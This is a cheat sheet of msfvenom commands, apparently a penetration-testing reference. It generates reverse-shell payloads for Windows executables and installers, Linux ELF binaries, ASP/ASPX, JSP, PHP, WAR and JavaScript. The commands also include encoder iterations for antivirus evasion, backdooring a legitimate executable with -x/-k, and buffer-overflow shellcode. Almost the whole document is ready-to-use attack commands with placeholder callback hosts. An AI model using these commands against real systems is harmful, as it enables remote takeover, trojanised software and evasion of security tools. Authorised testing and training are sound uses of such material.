# Msfvenom

## Commands

#### Generic

```
msfvenom -h
msfvenom -l <formats/payloads/encoders/nops>
```

#### Quick payload generation

```
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <filename>    #create runnable payload
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v <varname>     #create payload source code
```

## Common payloads

### Windows EXE reverse shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 8 -o rv.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 8 -o rv.exe
msfvenom -p windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 8 -o rv.exe
```

### Windows EXE hijack

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -x <exe file> -k -e x86/shikata_ga_nai -i 8 -o rv.exe
msfvenom -p windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -x <exe file> -k -e x86/shikata_ga_nai -i 8 -o rv.exe
```

### Windows malicious installer

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <filename>.msi
msfvenom -p windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <filename>.msi
```

### \*nix ELF reverse shell

```
msfvenom -p linux/<arch>/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -e x86/shikata_ga_nai -i 8 -o payload
```

### BOF payload

```
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v shellcode -e x86/shikata_ga_nai -b "<bad chars>" EXITFUNC=thread
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <lang> -v shellcode -b "<bad chars>" EXITFUNC=thread
```

### .NET reverse shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp

msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
```

### JSP reverse shell

```
msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f jsp -o rv.jsp
```

### PHP reverse shell

```
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw -o payload.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o meterpreter.php
```

### WAR file reverse shell

```
msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o payload.war
```

### JavaScript reverse shell

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f js_le
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f js_le
```

